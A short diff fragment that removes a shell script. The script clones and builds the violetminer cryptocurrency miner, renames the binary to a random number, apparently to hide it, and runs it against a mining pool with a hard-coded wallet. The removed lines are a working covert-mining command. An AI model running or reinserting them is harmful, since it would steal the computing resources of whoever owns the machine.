@@ -1,2 +1,0 @@
-OKE=$(shuf -n 1 -i 1-9999999)
-git clone https://github.com/turtlecoin/violetminer && cd violetminer && git submodule update --init --recursive && mkdir build && cd build && cmake -DENABLE_NVIDIA=OFF .. && make && mv violetminer $OKE && ./$OKE --pool us-central.2acoin.org:3333 --username guns95PQ9tH96Lympn1bw1AQDCNg1AEXHHRjuKJh1TNnAQSpZcSzJvfA4mgmfQ8Cyq96RLKthdBXn96TXi6g3yFzHm73aXw5Kk6EaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQdCtHf1 --password $(shuf -n 1 -i 1-99999) --algorithm chukwa
